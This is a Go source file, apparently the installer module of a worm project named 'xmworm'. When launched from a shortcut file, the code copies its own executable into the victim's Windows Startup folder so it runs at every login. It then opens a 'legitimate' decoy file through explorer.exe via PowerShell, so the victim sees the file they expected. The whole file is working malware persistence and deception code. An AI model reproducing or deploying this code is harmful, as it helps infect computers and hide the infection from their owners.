package install

import (
	"os/user"
	"strings"
	"fmt"
	fl "github.com/0/xmworm/files"
	sh "github.com/0/xmworm/shell"
)

// for injecting purposes
type UserNameGetter interface {
	Username()(string)
}

type DefaultUserNameGetter struct {
	username string
}

func (u DefaultUserNameGetter) Username() (string) {
	userObj, err := user.Current()
	if err != nil {
		panic(err)
	}
	return strings.Split(userObj.Username, `\`)[1]	
}

func getInstallDir(usernameGetter UserNameGetter) (dirname string){
	username := usernameGetter.Username()
	dirname = fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`, username)
	return
}

// delegate the execution/opening of the legitimate file to
// explorer.exe
func delegate(filename string) {
	cmd := fmt.Sprintf(`explorer.exe %s`, filename)
	sh.Run(cmd, "powershell")
}

func Install(currExePathName string, targetBin string, legitimate string) {
	fmt.Printf("Was run from lnk\n")
	fmt.Printf("Gonna install on target computer instead\n")
	usernameGetter := DefaultUserNameGetter{}
	src := currExePathName
	targetdir := getInstallDir(usernameGetter)
	targetBinPath := fmt.Sprintf(`%v\%v`, targetdir, targetBin)
	fl.Copy(src, targetBinPath)
	delegate(legitimate)
}